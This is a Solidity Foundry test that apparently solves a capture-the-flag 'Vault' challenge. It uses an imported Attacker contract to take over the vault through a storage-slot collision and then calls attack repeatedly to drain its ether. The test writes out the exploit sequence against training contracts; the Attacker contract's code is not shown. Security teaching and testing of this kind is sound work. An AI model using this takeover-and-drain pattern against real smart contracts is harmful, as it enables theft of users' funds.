// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/Attacker.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);


        // add your hacker code.
        Attacker attacker = new Attacker(vault);
        attacker.takeoverAndOpen(bytes32(uint256(uint160(address(logic)))));

        vm.deal(address(attacker), 1 ether);
        attacker.attack{value: 0.01 ether}(0.01 ether);

        uint256 remaining = address(vault).balance;
        if(remaining > 0){
            vm.deal(address(attacker), remaining);
            attacker.attack{value: remaining}(remaining);
        }

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
